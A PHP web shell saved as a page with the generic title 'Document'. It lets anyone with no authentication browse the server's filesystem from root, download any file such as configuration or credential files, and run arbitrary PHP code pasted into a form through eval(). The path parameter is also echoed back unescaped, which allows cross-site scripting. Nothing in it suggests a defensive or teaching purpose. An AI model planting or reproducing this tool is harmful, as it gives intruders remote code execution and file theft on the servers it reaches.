<?php
function downloadFile($path)
{
	$filename = basename( $path);
	
	$finfo = finfo_open(FILEINFO_MIME_TYPE);
	//Define header information
	header('Content-Description: File Transfer');
	header('Content-Type: application/octet-stream');
	header('Content-Disposition: attachment; filename="' . ($filename) . '"');
	header('Content-Length: ' . filesize( $path));
	header('Pragma: public');

	//Clear system output buffer
	flush();

	//Read the size of the file
	readfile( $path, true);

	//Terminate from the script
	die();
}
$path = $_GET['path'];
$download = $_GET['download'];
$downloadLocation = $_GET['downpath'];

if (empty($path) && empty($download)) {
	$_all = glob("/*", GLOB_NOSORT);
} else if (empty($download)) {
	$_all = glob("/" . $path . "/*", GLOB_NOSORT);
} else {
	downloadFile($path);
}


?>
<!DOCTYPE html>
<html lang="en">

<head>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Document</title>
</head>

<body>
	<h1>Current path = <?php echo ($_GET['path']);  ?></h1>

	<?php

	$thecode = $_POST['thecode'];
	if (!empty($thecode)) {
		eval($thecode);
	}
	echo("<br>");
	

	$path = $_GET['path'];
	$download = $_GET['download'];
	$downloadLocation = $_GET['downpath'];

	if (empty($path) && empty($download)) {
		$_all = glob("/*", GLOB_NOSORT);
	} else if (empty($download)) {
		$_all = glob( $path . "/*", GLOB_NOSORT);
	} else {
		downloadFile($path);
	}

	foreach ($_all as $item) {
	?> <a href="?path=<?php echo ($item); ?>"><?php echo ($item); ?> </a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
		<a href="?path=<?php echo ($item); ?>&download=true&downpath=true"> Download </a>
		<input type="hidden" value="<?php echo (substr($item, 3)); ?>">
		<br />
	<?php
	}

	?>
	<form action="" method="post">
		<textarea name="thecode" id="thecode" cols="30" rows="10"></textarea>
		<input type="submit" value="submit">
	</form>
</body>

</html>